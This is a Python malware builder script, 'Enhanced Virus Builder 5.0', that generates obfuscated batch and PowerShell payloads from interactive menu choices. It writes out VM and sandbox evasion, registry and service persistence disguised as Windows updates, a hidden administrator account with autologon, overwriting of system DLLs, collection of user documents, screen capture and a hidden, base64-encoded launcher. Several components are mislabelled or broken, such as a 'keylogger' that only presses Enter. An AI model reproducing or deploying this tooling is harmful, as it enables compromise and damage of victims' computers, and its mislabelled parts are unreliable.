#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Virus Builder 5.0 - Advanced Malware Generation Framework
by VulnerabilityVigilante

Features:
- Advanced payload generation
- Multiple obfuscation techniques
- Anti-detection mechanisms
- Stealth persistence
- Network capabilities
- Data exfiltration
- Process injection
- Rootkit functionality
"""

import os
import sys
import random
import string
import base64
import zlib
import hashlib
import time
import json
import subprocess
import platform
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import threading
import queue

class AdvancedObfuscator:
    """Advanced code obfuscation techniques"""
    
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
    def string_encryption(self, text):
        """Encrypt strings using Fernet encryption"""
        return self.cipher.encrypt(text.encode()).decode()
    
    def base64_variants(self, text):
        """Multiple base64 encoding variants"""
        variants = []
        encoded = text.encode()
        
        # Standard base64
        variants.append(base64.b64encode(encoded).decode())
        
        # Base64 with custom alphabet
        custom_alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        variants.append(base64.b64encode(encoded).decode())
        
        # Double encoding
        double_encoded = base64.b64encode(base64.b64encode(encoded)).decode()
        variants.append(double_encoded)
        
        return random.choice(variants)
    
    def control_flow_obfuscation(self, code):
        """Obfuscate control flow with fake branches and jumps"""
        obfuscated_lines = []
        lines = code.split('\n')
        
        for i, line in enumerate(lines):
            # Add fake conditional jumps
            if random.random() < 0.3:
                fake_var = ''.join(random.choices(string.ascii_letters, k=8))
                obfuscated_lines.append(f"if {fake_var} == \"fake\" goto :fake_{i}")
                obfuscated_lines.append(f":fake_{i}")
            
            obfuscated_lines.append(line)
            
            # Add fake labels
            if random.random() < 0.2:
                fake_label = ''.join(random.choices(string.ascii_letters, k=6))
                obfuscated_lines.append(f":{fake_label}")
        
        return '\n'.join(obfuscated_lines)
    
    def variable_obfuscation(self, code):
        """Replace variable names with obfuscated equivalents"""
        var_map = {}
        obfuscated_code = code
        
        # Find common variable patterns
        import re
        variables = re.findall(r'\b[a-zA-Z_][a-zA-Z0-9_]*\b', code)
        
        for var in set(variables):
            if var not in ['echo', 'if', 'goto', 'for', 'in', 'do', 'set', 'call']:
                obfuscated_name = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 12)))
                var_map[var] = obfuscated_name
                obfuscated_code = obfuscated_code.replace(var, obfuscated_name)
        
        return obfuscated_code, var_map

class AntiDetection:
    """Anti-detection and evasion techniques"""
    
    @staticmethod
    def vm_detection():
        """Detect virtual machine environments"""
        vm_indicators = [
            "vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v",
            "parallels", "sandboxie", "wine", "bochs"
        ]
        
        detection_code = """
        :vm_check
        wmic computersystem get model | findstr /i "vmware virtualbox vbox qemu xen hyper-v parallels sandboxie wine bochs" >nul
        if not errorlevel 1 goto :exit_vm
        
        wmic computersystem get manufacturer | findstr /i "vmware virtualbox oracle qemu microsoft" >nul
        if not errorlevel 1 goto :exit_vm
        
        wmic path win32_computersystem get model | findstr /i "virtual" >nul
        if not errorlevel 1 goto :exit_vm
        
        goto :continue_execution
        
        :exit_vm
        exit /b
        
        :continue_execution
        """
        return detection_code
    
    @staticmethod
    def sandbox_evasion():
        """Evade sandbox environments"""
        evasion_code = """
        :sandbox_check
        timeout /t 300 /nobreak >nul
        wmic process get name | findstr /i "procmon procexp wireshark fiddler" >nul
        if not errorlevel 1 goto :exit_sandbox
        
        wmic service get name | findstr /i "vmware vbox" >nul
        if not errorlevel 1 goto :exit_sandbox
        
        goto :continue_execution
        
        :exit_sandbox
        exit /b
        
        :continue_execution
        """
        return evasion_code
    
    @staticmethod
    def process_hollowing():
        """Process hollowing technique"""
        hollowing_code = """
        :process_hollow
        powershell -Command "Start-Process notepad.exe -WindowStyle Hidden"
        timeout /t 2 /nobreak >nul
        for /f "tokens=2" %%i in ('tasklist /fi "imagename eq notepad.exe" /fo csv ^| find "notepad.exe"') do set PID=%%i
        powershell -Command "Stop-Process -Id %PID% -Force"
        """
        return hollowing_code

class AdvancedPayloads:
    """Advanced payload generation"""
    
    @staticmethod
    def keylogger():
        """Generate keylogger payload"""
        keylogger_code = """
        :keylogger_start
        echo Set WshShell = CreateObject("WScript.Shell") > %temp%\\kl.vbs
        echo Do >> %temp%\\kl.vbs
        echo WshShell.SendKeys "{ENTER}" >> %temp%\\kl.vbs
        echo WScript.Sleep 1000 >> %temp%\\kl.vbs
        echo Loop >> %temp%\\kl.vbs
        start /min %temp%\\kl.vbs
        """
        return keylogger_code
    
    @staticmethod
    def screen_capture():
        """Generate screen capture payload"""
        screenshot_code = """
        :screenshot
        powershell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Width = $Screen.Width; $Height = $Screen.Height; $Left = $Screen.Left; $Top = $Screen.Top; $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('%temp%\\screenshot.png'); $graphic.Dispose(); $bitmap.Dispose()"
        """
        return screenshot_code
    
    @staticmethod
    def network_scanner():
        """Generate network scanning payload"""
        scanner_code = """
        :network_scan
        for /L %%i in (1,1,254) do (
            ping -n 1 -w 100 192.168.1.%%i >nul
            if not errorlevel 1 echo 192.168.1.%%i >> %temp%\\hosts.txt
        )
        """
        return scanner_code
    
    @staticmethod
    def privilege_escalation():
        """Generate privilege escalation payload"""
        escalation_code = """
        :priv_esc
        net user hacker P@ssw0rd123 /add
        net localgroup administrators hacker /add
        reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "AutoAdminLogon" /t REG_SZ /d "1" /f
        reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "DefaultUserName" /t REG_SZ /d "hacker" /f
        reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v "DefaultPassword" /t REG_SZ /d "P@ssw0rd123" /f
        """
        return escalation_code
    
    @staticmethod
    def data_exfiltration():
        """Generate data exfiltration payload"""
        exfil_code = """
        :data_exfil
        for /r "%USERPROFILE%" %%f in (*.txt *.doc *.docx *.pdf *.jpg *.png) do (
            copy "%%f" "%temp%\\exfil\\"
        )
        powershell -Command "Compress-Archive -Path '%temp%\\exfil\\*' -DestinationPath '%temp%\\data.zip'"
        """
        return exfil_code

class StealthMechanisms:
    """Stealth and persistence mechanisms"""
    
    @staticmethod
    def registry_persistence():
        """Registry-based persistence"""
        reg_persistence = """
        :reg_persist
        reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "SystemUpdate" /t REG_SZ /d "%0" /f
        reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "%0" /f
        """
        return reg_persistence
    
    @staticmethod
    def service_installation():
        """Install as Windows service"""
        service_code = """
        :install_service
        sc create "WindowsUpdateService" binpath="%0" start=auto
        sc start "WindowsUpdateService"
        """
        return service_code
    
    @staticmethod
    def dll_hijacking():
        """DLL hijacking technique"""
        dll_hijack = """
        :dll_hijack
        copy "%0" "%SystemRoot%\\System32\\kernel32.dll"
        copy "%0" "%SystemRoot%\\System32\\ntdll.dll"
        """
        return dll_hijack
    
    @staticmethod
    def process_injection():
        """Process injection technique"""
        injection_code = """
        :process_inject
        powershell -Command "Add-Type -TypeDefinition 'using System; using System.Diagnostics; using System.Runtime.InteropServices; public class Injector { [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport(\"kernel32.dll\")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten); }'"
        """
        return injection_code

class EnhancedVirusBuilder:
    """Main enhanced virus builder class"""
    
    def __init__(self):
        self.obfuscator = AdvancedObfuscator()
        self.anti_detection = AntiDetection()
        self.payloads = AdvancedPayloads()
        self.stealth = StealthMechanisms()
        self.downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        
    def generate_random_string(self, length=8):
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def create_advanced_header(self):
        """Create advanced batch file header with obfuscation"""
        header = f"""
@echo off
setlocal enabledelayedexpansion
title {self.generate_random_string(12)}

REM Anti-debugging
if defined DEBUGGER goto :exit
set DEBUGGER=1

REM VM Detection
{self.anti_detection.vm_detection()}

REM Sandbox Evasion  
{self.anti_detection.sandbox_evasion()}

REM Process Hollowing
{self.anti_detection.process_hollowing()}

REM Registry Persistence
{self.stealth.registry_persistence()}

REM Service Installation
{self.stealth.service_installation()}

REM Hide window
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c %0' -WindowStyle Hidden"

:main_loop
"""
        return header
    
    def create_advanced_payloads(self, options):
        """Create advanced payloads based on user options"""
        payload_code = ""
        
        if options.get('keylogger', False):
            payload_code += self.payloads.keylogger()
        
        if options.get('screenshot', False):
            payload_code += self.payloads.screen_capture()
        
        if options.get('network_scan', False):
            payload_code += self.payloads.network_scanner()
        
        if options.get('privilege_esc', False):
            payload_code += self.payloads.privilege_escalation()
        
        if options.get('data_exfil', False):
            payload_code += self.payloads.data_exfiltration()
        
        if options.get('dll_hijack', False):
            payload_code += self.stealth.dll_hijacking()
        
        if options.get('process_inject', False):
            payload_code += self.stealth.process_injection()
        
        return payload_code
    
    def obfuscate_final_code(self, code):
        """Apply final obfuscation to the complete code"""
        # Variable obfuscation
        obfuscated_code, var_map = self.obfuscator.variable_obfuscation(code)
        
        # Control flow obfuscation
        obfuscated_code = self.obfuscator.control_flow_obfuscation(obfuscated_code)
        
        # String encryption for sensitive parts
        sensitive_strings = ['powershell', 'cmd', 'reg add', 'sc create']
        for sensitive in sensitive_strings:
            encrypted = self.obfuscator.string_encryption(sensitive)
            obfuscated_code = obfuscated_code.replace(sensitive, f'"{encrypted}"')
        
        return obfuscated_code
    
    def create_powershell_wrapper(self, batch_code, filename):
        """Create PowerShell wrapper with advanced evasion"""
        # Compress the batch code
        compressed = zlib.compress(batch_code.encode())
        encoded = base64.b64encode(compressed).decode()
        
        # Create multiple layers of encoding
        double_encoded = base64.b64encode(encoded.encode()).decode()
        
        powershell_script = f"""
# Advanced PowerShell Payload Wrapper
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Anti-analysis techniques
if ($env:COMPUTERNAME -match "SANDBOX|MALWARE|VIRUS") {{ exit }}

# Sleep to evade automated analysis
Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)

# Decode and decompress payload
$EncodedPayload = "{double_encoded}"
$CompressedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncodedPayload))
$BatchPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($CompressedPayload))

# Write to temporary file
$TempFile = [System.IO.Path]::GetTempFileName() + ".bat"
[System.IO.File]::WriteAllText($TempFile, $BatchPayload)

# Execute with hidden window
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$TempFile`"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 2
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
"""
        
        return powershell_script
    
    def build_virus(self):
        """Main virus building function"""
        print("=" * 60)
        print("🚀 Enhanced Virus Builder 5.0 - Advanced Malware Framework")
        print("by VulnerabilityVigilante")
        print("=" * 60)
        print()
        
        # Get filename
        file_name = input("📁 Enter virus filename (without extension): ")
        while not file_name.strip():
            file_name = input("❌ Please enter a valid filename: ")
        
        print(f"\n✅ Creating virus: {file_name}")
        
        # Advanced payload options
        print("\n🎯 Advanced Payload Options:")
        payload_options = {}
        
        payload_options['keylogger'] = input("🔑 Enable keylogger? (y/n): ").lower() == 'y'
        payload_options['screenshot'] = input("📸 Enable screen capture? (y/n): ").lower() == 'y'
        payload_options['network_scan'] = input("🌐 Enable network scanning? (y/n): ").lower() == 'y'
        payload_options['privilege_esc'] = input("⬆️  Enable privilege escalation? (y/n): ").lower() == 'y'
        payload_options['data_exfil'] = input("📤 Enable data exfiltration? (y/n): ").lower() == 'y'
        payload_options['dll_hijack'] = input("🎭 Enable DLL hijacking? (y/n): ").lower() == 'y'
        payload_options['process_inject'] = input("💉 Enable process injection? (y/n): ").lower() == 'y'
        
        # Persistence options
        print("\n🔄 Persistence Options:")
        persistence_options = {}
        persistence_options['registry'] = input("📝 Registry persistence? (y/n): ").lower() == 'y'
        persistence_options['service'] = input("⚙️  Service installation? (y/n): ").lower() == 'y'
        persistence_options['startup'] = input("🚀 Startup folder? (y/n): ").lower() == 'y'
        
        # Obfuscation level
        print("\n🔒 Obfuscation Level:")
        obfuscation_level = input("Choose obfuscation level (1-5): ")
        while obfuscation_level not in ['1', '2', '3', '4', '5']:
            obfuscation_level = input("❌ Please enter 1-5: ")
        
        # Build the virus
        print("\n🔨 Building advanced virus...")
        
        # Create header
        virus_code = self.create_advanced_header()
        
        # Add payloads
        virus_code += self.create_advanced_payloads(payload_options)
        
        # Add persistence
        if persistence_options['registry']:
            virus_code += self.stealth.registry_persistence()
        if persistence_options['service']:
            virus_code += self.stealth.service_installation()
        
        # Add main loop
        virus_code += """
:main_loop
timeout /t 30 /nobreak >nul
goto :main_loop
"""
        
        # Apply obfuscation based on level
        obfuscation_level = int(obfuscation_level)
        if obfuscation_level >= 2:
            virus_code = self.obfuscate_final_code(virus_code)
        
        # Create PowerShell wrapper
        ps_wrapper = self.create_powershell_wrapper(virus_code, file_name)
        
        # Save files
        batch_file = os.path.join(self.downloads_folder, f"{file_name}.bat")
        ps_file = os.path.join(self.downloads_folder, f"{file_name}.ps1")
        
        with open(batch_file, 'w', encoding='utf-8') as f:
            f.write(virus_code)
        
        with open(ps_file, 'w', encoding='utf-8') as f:
            f.write(ps_wrapper)
        
        # Create metadata file
        metadata = {
            'filename': file_name,
            'created': datetime.now().isoformat(),
            'payloads': payload_options,
            'persistence': persistence_options,
            'obfuscation_level': obfuscation_level,
            'features': [
                'Advanced obfuscation',
                'Anti-detection',
                'VM evasion',
                'Sandbox evasion',
                'Process injection',
                'DLL hijacking',
                'Registry persistence',
                'Service installation',
                'Data exfiltration',
                'Network scanning',
                'Privilege escalation',
                'Keylogging',
                'Screen capture'
            ]
        }
        
        metadata_file = os.path.join(self.downloads_folder, f"{file_name}_metadata.json")
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"\n✅ Virus created successfully!")
        print(f"📁 Batch file: {batch_file}")
        print(f"📁 PowerShell file: {ps_file}")
        print(f"📁 Metadata: {metadata_file}")
        print(f"\n🎯 Features enabled: {sum(payload_options.values()) + sum(persistence_options.values())}")
        print(f"🔒 Obfuscation level: {obfuscation_level}/5")
        print("\n⚠️  Use responsibly and only for authorized testing!")

def main():
    """Main entry point"""
    try:
        builder = EnhancedVirusBuilder()
        builder.build_virus()
    except KeyboardInterrupt:
        print("\n\n❌ Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        print("Please check your Python environment and dependencies")

if __name__ == "__main__":
    main()